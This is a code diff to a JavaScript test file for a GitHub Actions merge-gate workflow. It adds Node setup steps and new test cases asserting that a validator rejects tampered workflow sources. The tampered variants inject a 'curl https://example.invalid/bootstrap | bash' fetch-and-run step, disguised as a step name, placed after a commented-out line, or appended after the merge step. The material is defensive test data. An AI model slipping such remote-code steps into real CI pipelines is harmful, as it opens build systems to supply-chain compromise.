@@ -113,6 +113,9 @@ jobs:
         with:
           ref: \${{ github.event.merge_group.base_sha }}
           persist-credentials: false
+      - uses: actions/setup-node@v4
+        with:
+          node-version: 24
       - run: node scripts/operator-protected-merge-gate-v2.mjs evidence
   operator-merge-queue-boundary:
     name: operator-merge-queue-boundary
@@ -128,6 +131,9 @@ jobs:
         with:
           ref: \${{ github.event.merge_group.base_sha }}
           persist-credentials: false
+      - uses: actions/setup-node@v4
+        with:
+          node-version: 24
       - run: node scripts/operator-protected-merge-gate-v2.mjs approve
   personal-repository-evidence:
     name: personal-repository-evidence
@@ -144,6 +150,9 @@ jobs:
         with:
           ref: \${{ github.sha }}
           persist-credentials: false
+      - uses: actions/setup-node@v4
+        with:
+          node-version: 24
       - run: node scripts/operator-protected-personal-repository-merge.mjs evidence
   operator-personal-repository-approval:
     name: operator-personal-repository-approval
@@ -162,6 +171,9 @@ jobs:
         with:
           ref: \${{ github.sha }}
           persist-credentials: false
+      - uses: actions/setup-node@v4
+        with:
+          node-version: 24
       - run: node scripts/operator-protected-personal-repository-merge.mjs approve
   operator-personal-repository-squash-merge:
     name: operator-personal-repository-squash-merge
@@ -180,6 +192,9 @@ jobs:
         with:
           ref: \${{ github.sha }}
           persist-credentials: false
+      - uses: actions/setup-node@v4
+        with:
+          node-version: 24
       - run: node scripts/operator-protected-personal-repository-merge.mjs merge
 `;
 }
@@ -262,6 +277,34 @@ test('admits only the exact personal-repository fallback workflow source', () =>
     content.replace('cancel-in-progress: false', 'cancel-in-progress: true'),
     content.replace("github.event_name == 'workflow_dispatch'", "github.event_name == 'merge_group'"),
     content.replace('persist-credentials: false', 'persist-credentials: true'),
+    content.replace(
+      '      - run: node scripts/operator-protected-personal-repository-merge.mjs evidence',
+      [
+        '      - name: node scripts/operator-protected-personal-repository-merge.mjs evidence',
+        '        run: curl https://example.invalid/bootstrap | bash',
+      ].join('\n'),
+    ),
+    content.replace(
+      '      - run: node scripts/operator-protected-personal-repository-merge.mjs approve',
+      [
+        '      # node scripts/operator-protected-personal-repository-merge.mjs approve',
+        '      - run: curl https://example.invalid/bootstrap | bash',
+      ].join('\n'),
+    ),
+    content.replace(
+      '      - run: node scripts/operator-protected-personal-repository-merge.mjs merge',
+      [
+        '      - run: node scripts/operator-protected-personal-repository-merge.mjs merge',
+        '      - run: curl https://example.invalid/bootstrap | bash',
+      ].join('\n'),
+    ),
+    content.replace(
+      '      - run: node scripts/operator-protected-personal-repository-merge.mjs merge',
+      [
+        '      - run: node scripts/operator-protected-personal-repository-merge.mjs merge',
+        '        shell: bash',
+      ].join('\n'),
+    ),
   ]) {
     const blocked = validatePersonalRepositoryProtectedWorkflowSource({
       ...exact,
